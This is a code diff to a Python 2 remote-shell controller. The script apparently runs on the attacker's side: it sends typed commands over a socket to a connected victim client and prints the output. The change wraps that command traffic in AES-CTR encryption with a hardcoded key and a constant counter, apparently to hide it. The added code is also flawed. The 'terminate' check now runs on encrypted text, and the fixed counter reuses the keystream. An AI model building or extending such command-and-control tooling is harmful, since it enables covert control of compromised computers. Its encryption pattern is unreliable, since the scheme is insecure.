@@ -1,4 +1,16 @@
 import socket
+from Crypto.Cipher import AES
+
+counter = "X" * 16
+key = "X" * 16
+
+def encrypt(message):
+    enc = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
+    return enc.encrypt(message)
+
+def decrypt(message):
+    enc = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
+    return enc.decrypt(message)
 
 def transfer(conn, command):
 
@@ -29,6 +41,7 @@ def connect():
     while True:
 
         command = raw_input("Shell > " )
+        command = encrypt(command)
 
         if 'terminate' in command:
             #Send terminate signal to the client
@@ -42,7 +55,7 @@ def connect():
 
         else:
             conn.send(command)
-            print conn.recv(1024)
+            print decrypt(conn.recv(1024))
 
 def main():
     connect()
